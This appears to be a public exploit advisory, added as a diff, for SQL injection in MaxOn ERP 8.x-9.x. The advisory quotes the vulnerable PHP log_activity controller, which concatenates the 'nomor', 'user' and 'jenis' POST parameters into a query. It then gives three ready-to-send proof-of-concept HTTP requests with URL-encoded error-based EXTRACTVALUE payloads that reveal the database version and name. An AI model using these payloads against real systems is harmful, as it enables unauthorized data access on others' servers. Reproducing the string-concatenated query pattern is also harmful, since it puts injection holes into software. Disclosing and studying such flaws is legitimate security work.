@@ -1,0 +1,118 @@
+# Exploit Title: MaxOn ERP Software 8.x-9.x - 'nomor' SQL Injection
+# Dork: N/A
+# Date: 2018-10-15
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.talagasoft.com
+# Software Link: http://demo.maxonerp.com/
+# Software Download: https://datapacket.dl.sourceforge.net/project/maxon/maxon.rar
+# Version: 8.x-9.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# Description
+# All users can run sql injection codes.
+# 
+# [PATH]/pos/controllers/User.php Line:350
+# [PATH]/application/controllers/User.php Line:414
+# function log_activity(){
+# 	$sql="select * from syslog where 1=1";
+# 	$nomor="";$jenis="";$user="";
+# 	if($this->input->post()){
+# 		if($nomor=$this->input->post('nomor')){
+# 			if($nomor!="")$sql.=" and no_bukti='$nomor'";
+# 		}
+# 		if($user=$this->input->post('user')){
+# 			if($user!="")$sql.=" and userid='$user'";
+# 		}
+# 		if($jenis=$this->input->post('jenis')){
+# 			if($jenis!="")$sql.=" and jenis_cmd='$jenis'";
+# 		}
+# 		
+# 	}
+# 	$sql.=" order by tgljam desc limit 1000";
+# 	$data["user"]=$user;
+# 	$data["nomor"]=$nomor;
+# 	$data["jenis"]=$jenis;
+# 	
+# 	$data['syslog']=$this->db->query($sql);
+# 	$this->template->display("log_list",$data);
+# }
+
+# POC: 
+# 1)
+# http://TARGET/[PATH]/index.php/user/log_activity
+
+POST /index.php/user/log_activity HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=3ba3e8a3b82a8e489cd16703fa5d0d327b84074c
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 253
+nomor=%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%32%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73%69%6f%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58
+HTTP/1.1 500 Internal Server Error
+Date: Sat, 15 Oct 2018 00:22:45 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+X-Powered-By: PleskLin
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://TARGET/[PATH]/index.php/user/log_activity
+
+POST /index.php/user/log_activity HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=3ba3e8a3b82a8e489cd16703fa5d0d327b84074c
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 252
+user=%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%32%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73%69%6f%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58
+HTTP/1.1 500 Internal Server Error
+Date: Sat, 15 Oct 2018 00:29:02 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+X-Powered-By: PleskLin
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://TARGET/[PATH]/index.php/user/log_activity
+
+POST /index.php/user/log_activity HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ci_session=3ba3e8a3b82a8e489cd16703fa5d0d327b84074c
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 253
+jenis=%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%32%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73%69%6f%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58
+HTTP/1.1 500 Internal Server Error
+Date: Sat, 15 Oct 2018 00:35:52 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+X-Powered-By: PleskLin
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
